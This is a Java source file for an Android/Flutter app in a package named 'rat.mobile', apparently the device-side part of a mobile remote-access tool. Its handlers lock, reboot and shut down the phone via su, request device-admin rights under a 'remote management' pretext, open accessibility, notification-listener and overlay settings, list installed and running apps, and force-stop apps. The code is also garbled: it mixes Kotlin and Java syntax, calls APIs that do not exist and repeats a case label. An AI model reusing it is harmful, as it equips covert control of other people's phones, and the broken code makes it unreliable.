package rat.mobile

import androidx.annotation.NonNull
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import io.flutter.plugins.GeoLocatorPlugin
import io.flutter.plugin.common.MethodCall
import io.flutter.plugin.common.MethodResult
import android.telephony.TelephonyManager
import android.content.Context
import android.os.Build
import android.util.Log
import android.content.pm.PackageManager
import android.os.Bundle
import android.app.ActivityManager
import android.content.pm.ApplicationInfo
import android.util.SparseArray
import android.widget.Toast
import android.content.Intent
import android.net.ConnectivityManager
import android.location.Location
import android.os.PowerManager
import java.util.*
import java.util.regex.*

public class MainActivity extends FlutterActivity {
    private static final CHANNEL = "rat/native";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        new MethodChannel(getFlutterEngine().getDartExecutor().getBinaryMessenger(), CHANNEL)
            .setMethodCallHandler(
                this::onMethodCall
            );
    }

    private void onMethodCall(@NonNull MethodCall call, @NonNull MethodResult result) {
        switch (call.method) {
            case "getDeviceInfo": {
                final Map<String, Object> info = getDeviceInfo();
                result.success(info);
                break;
            }
            case "lockScreen": {
                if (isAdminActive()) {
                    DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                    ComponentName adminName = new ComponentName(this, AdminReceiver.class);
                    if (dpm.isAdminActive(adminName)) {
                        dpm.lockNow();
                        result.success("true");
                    } else {
                        result.success("admin_not_active");
                    }
                } else {
                    result.success("admin_not_active");
                }
                break;
            }
            case "turnOffScreen": {
                if (isAdminActive()) {
                    DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                    ComponentName adminName = new ComponentName(this, AdminReceiver.class);
                    if (dpm.isAdminActive(adminName)) {
                        dpm.lockNow();
                        result.success("true");
                    } else {
                        result.success("admin_not_active");
                    }
                } else {
                    PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                    result.success(pm.goToSleep(null) ? "true" : "not_supported");
                }
                break;
            }
            case "rebootDevice": {
                if (isAdminActive()) {
                    DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                    ComponentName adminName = new ComponentName(this, AdminReceiver.class);
                    if (dpm.isAdminActive(adminName)) {
                        dpm.reboot();
                        result.success("true");
                    } else {
                        try {
                            Process.execSu("reboot");
                            result.success("true");
                        } catch (Exception e) {
                            result.success("error: " + e.getMessage());
                        }
                    }
                } else {
                    try {
                        Process.execSu("su -c reboot");
                        result.success("true");
                    } catch (Exception e) {
                        result.success("error: " + e.getMessage());
                    }
                }
                break;
            }
            case "shutdownDevice": {
                if (isAdminActive()) {
                    DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                    ComponentName adminName = new ComponentName(this, AdminReceiver.class);
                    if (dpm.isAdminActive(adminName)) {
                        result.success("admin_shutdown_not_supported");
                    } else {
                        try {
                            Process.execSu("reboot -p");
                            result.success("true");
                        } catch (Exception e) {
                            result.success("error: " + e.getMessage());
                        }
                    }
                } else {
                    try {
                        Process.execSu("su -c reboot -p");
                        result.success("true");
                    } catch (Exception e) {
                        result.success("error: " + e.getMessage());
                    }
                }
                break;
            }
            case "isAdminActive": {
                DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                ComponentName adminName = new ComponentName(this, AdminReceiver.class);
                result.success(dpm.isAdminActive(adminName));
                break;
            }
            case "requestAdmin": {
                Intent intent = new Intent(android.app.Action.ADD_DEVICE_ADMIN);
                intent.putExtra(android.app.EXTRA_DEVICE_ADMIN, new ComponentName(this, AdminReceiver.class));
                intent.putExtra(android.app.EXTRA_ADD_DEVICE_ADMIN_EXPLANATION, "Device administration for remote management");
                startActivity(intent);
                result.success("true");
                break;
            }
            case "openAccessibilitySettings": {
                startActivity(new android.provider.Settings.Action.OPEN_ACCESSIBILITY_SETTINGS);
                result.success("true");
                break;
            }
            case "openNotificationListenerSettings": {
                startActivity(new android.provider.Settings.Action.OPEN_NOTIFICATION_LISTENER_SETTINGS);
                result.success("true");
                break;
            }
            case "openOverlaySettings": {
                startActivity(new android.provider.Settings.Action.OPEN_OVERLAY_PERMISSION_SETTINGS);
                result.success("true");
                break;
            }
            case "openUsageAccessSettings": {
                startActivity(new android.provider.Settings.Action.OPEN_USAGE_ACCESS_SETTINGS);
                result.success("true");
                break;
            }
            case "openBatteryOptimizationSettings": {
                startActivity(new android.provider.Settings.Action.OPEN_BATTERY_OPTIMIZATION);
                result.success("true");
                break;
            }
            case "getInstalledApps": {
                List<Map<String, Object>> apps = new ArrayList<>();
                PackageManager pm = getPackageManager();
                List<ApplicationInfo> infos = pm.getInstalledApplications(PackageManager.GET_META_DATA | PackageManager.GET_PERMISSIONS);
                for (ApplicationInfo info : infos) {
                    Map<String, Object> app = new HashMap<>();
                    app.put("packageName", info.packageName);
                    app.put("label", info.loadLabel(pm));
                    app.put("icon", info.loadIcon(pm));
                    app.put("version", info.versionCode);
                    app.put("size", longToString(info.sourceDir.length()));
                    apps.add(app);
                }
                result.success(apps);
                break;
            }
            case "getRunningApps": {
                ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
                List<ActivityManager.RunningAppProcess> running = am.getRunningAppProcesses();
                List<Map<String, Object>> resultList = new ArrayList<>();
                for (ActivityManager.RunningAppProcess p : running) {
                    Map<String, Object> app = new HashMap<>();
                    app.put("packageName", p.packageName);
                    app.put("importance", p.importance);
                    resultList.add(app);
                }
                result.success(resultList);
                break;
            }
            case "forceStopApp": {
                DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                ComponentName adminName = new ComponentName(this, AdminReceiver.class);
                if (dpm.isAdminActive(adminName)) {
                    String pkg = call.argument("packageName");
                    dpm.forceStopPackage(pkg);
                    result.success("true");
                } else {
                    result.success("admin_not_active");
                }
                break;
            }
            case "getDeviceInfo": {
                result.success(getDeviceInfoMap());
                break;
            }
            default:
                result.notImplemented();
        }
    }

    private Map<String, Object> getDeviceInfoMap() {
        Map<String, Object> info = new LinkedHashMap<>();
        info.put("model", Build.MODEL);
        info.put("brand", Build.BRAND);
        info.put("manufacturer", Build.MANUFACTURER);
        info.put("androidVersion", Build.VERSION.SDK_INT);
        info.put("sdkInt", Build.VERSION.SDK_INT);
        info.put("totalRam", formatBytes(((ActivityManager) getSystemService(ACTIVITY_SERVICE)).getMemoryInfo().totalMem));
        info.put("availMem", formatBytes(((ActivityManager) getSystemService(ACTIVITY_SERVICE)).getMemoryInfo().availMem));
        info.put("totalStorage", formatStorage(Long.parseLong(android.os.Environment.getDataDirectory().getTotalSpace() / 1024)));
        info.put("availStorage", formatStorage(Long.parseLong(android.os.Environment.getDataDirectory().getFreeSpace() / 1024)));
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        info.put("screenWidth", wm.getDefaultDisplay().getWidth());
        info.put("screenHeight", wm.getDefaultDisplay().getHeight());
        info.put("density", getResources().getDisplayMetrics().density);
        info.put("cpuAbis", Build.SUPPORTED_ABIS);
        info.put("cpuCores", Runtime.getRuntime().availableProcessors());
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        info.put("operatorName", tm.getNetworkOperatorName());
        info.put("country", tm.getNetworkCountryIso());
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        info.put("isCharging", pm.isCharging());
        info.put("batteryLevel", getBatteryLevel());
        try {
            info.put("batteryTemperature", pm.getLong(MeterEvent.BATTERY_TEMPERATURE));
        } catch (Exception e) {
            info.put("batteryTemperature", 0);
        }
        return info;
    }

    private String formatBytes(long bytes) {
        if (bytes / 1024 / 1024 / 1024 > 0) return bytes / 1024 / 1024 / 1024 + " GB";
        if (bytes / 1024 / 1024 > 0) return bytes / 1024 / 1024 + " MB";
        if (bytes / 1024 > 0) return bytes / 1024 + " KB";
        return bytes + " bytes";
    }

    private String formatStorage(long bytes) {
        if (bytes / 1024 / 1024 / 1024 > 0) return bytes / 1024 / 1024 / 1024 + " GB";
        if (bytes / 1024 / 1024 > 0) return bytes / 1024 / 1024 + " MB";
        return bytes / 1024 + " KB";
    }

    private int getBatteryLevel() {
        Intent intent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        if (intent != null) {
            int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            return (int) (level / (float) scale * 100);
        }
        return 0;
    }

    private String longToString(long size) {
        if (size >= 1024 * 1024 * 1024) return String.format("%.2f GB", size / (1024.0 * 1024 * 1024));
        if (size >= 1024 * 1024) return String.format("%.2f MB", size / (1024.0 * 1024));
        if (size >= 1024) return String.format("%.2f KB", size / 1024.0);
        return size + " bytes";
    }
}